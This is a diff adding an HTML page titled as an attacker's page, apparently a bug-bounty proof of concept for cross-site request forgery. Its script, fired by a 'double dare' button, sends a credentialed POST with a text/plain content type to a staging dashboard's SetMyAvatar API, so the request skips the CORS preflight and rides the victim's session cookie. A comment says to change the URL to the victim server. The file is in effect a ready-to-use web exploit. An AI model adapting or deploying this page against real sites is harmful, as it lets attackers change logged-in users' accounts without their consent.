@@ -1,0 +1,27 @@
+<html>
+	<head>
+		<title>This is the attacker page</title>
+	</head>
+	<body>
+		<p> This is the attacker's page</p>
+		<button type="button" onclick="csrf()">I double dare you</button>
+		<br>
+		<textarea id='demo'></textarea>
+		<script>
+			function csrf() {
+			var data = '{"picUrl":"https://cdn.zota-stage.com/avatars/80209960-606a-4982-b302-888618eb670c.png"}';
+			  var xhttp = new XMLHttpRequest();
+			  xhttp.onreadystatechange = function() {
+			    if (this.readyState == 4 && this.status == 200) {
+			      document.getElementById("demo").innerHTML = this.responseText; //we won't be getting to this part.
+			    }
+			  };
+			  //Sending as a simple POST request prevents the OPTIONS pre-check from firing.
+			  xhttp.open("POST", "https://dashboard.zota-stage.com/api/v2/m/BUGBOUNTY4/objects/exec/SetMyAvatar/", true); //change the url to your victim server IP
+			  xhttp.withCredentials = true; //send the session cookie
+			  xhttp.setRequestHeader("Content-type", "text/plain");
+			  xhttp.send(data);
+			}
+		</script>
+	</body>
+</html>
